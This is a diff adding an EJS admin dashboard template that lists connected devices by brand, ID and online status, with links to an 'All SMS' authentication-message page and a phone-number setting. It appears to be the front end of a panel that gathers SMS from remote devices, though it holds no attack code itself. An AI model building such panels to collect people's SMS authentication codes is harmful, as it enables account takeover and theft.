@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="/css/phon.css" />
+</head>
+
+<body>
+  <nav class="header-nav">
+    <div class="menu-icon">&#9776;</div>
+    <h1 class="centered-title">Admin</h1>
+    <button id="logoutAllButton">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
+        <path d="M502.6 233.4l-96-96c-9.4-9.4-24.6-9.4-33.9 0s-9.4 24.6 0 33.9L402.1 224H192c-13.3 0-24 10.7-24 24s10.7 24 24 24h210.1l-29.4 29.4c-9.4 9.4-9.4 24.6 0 33.9s24.6 9.4 33.9 0l96-96c9.5-9.4 9.5-24.6 0-33.8zM320 80H80c-26.5 0-48 21.5-48 48v256c0 26.5 21.5 48 48 48h240c26.5 0 48-21.5 48-48v-48c0-13.3-10.7-24-24-24s-24 10.7-24 24v48c0 0.6-.4 1-1 1H81c-.6 0-1-0.4-1-1V129c0-.6.4-1 1-1h238c0.6 0 1 .4 1 1v49c0 13.3 10.7 24 24 24s24-10.7 24-24v-49c0-26.5-21.5-48-48-48z"/>
+      </svg>
+    </button>
+  </nav>
+
+  <div class="nav-links">
+    <a href="/api/admin/settings">Update Number</a>
+    <a href="/api/notification/sms-auth">All SMS</a>
+    <a href="/api/auth/change-credentials">Change Password</a>
+  </div>
+
+  <div class="dot">
+    <div class="container" id="deviceContainer">
+      <% 
+        // Sort users so newest (by creation time) is first
+        const sortedUsers = users.slice().sort((a, b) => {
+          return new Date(b.createdAt || b._id.getTimestamp()) - new Date(a.createdAt || a._id.getTimestamp());
+        });
+        sortedUsers.forEach((user, idx) => {
+          const name = user.userEntries?.[0]?.name || user.brand || "Unknown";
+          const statusClass = user.connectivity === 'Online' ? 'status-online' : 'status-offline';
+      %>
+        <div class="device-card" data-id="<%= user.uniqueid %>">
+          <div class="device-content">
+            <img src="/image/style.webp" alt="User Icon" />
+            <div class="device-details">
+              <h2>User <%= idx + 1 %>: <%= name %></h2>
+              <p><strong>ID:</strong> <%= user.uniqueid %></p>
+            </div>
+          </div>
+          <div class="device-status <%= statusClass %>">
+            Status – <%= user.connectivity %>
+          </div>
+        </div>
+      <% }) %>
+    </div>
+  </div>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="/js/script.js"></script>
+  <script src="/js/logout.js"></script>
+</body>
+</html>
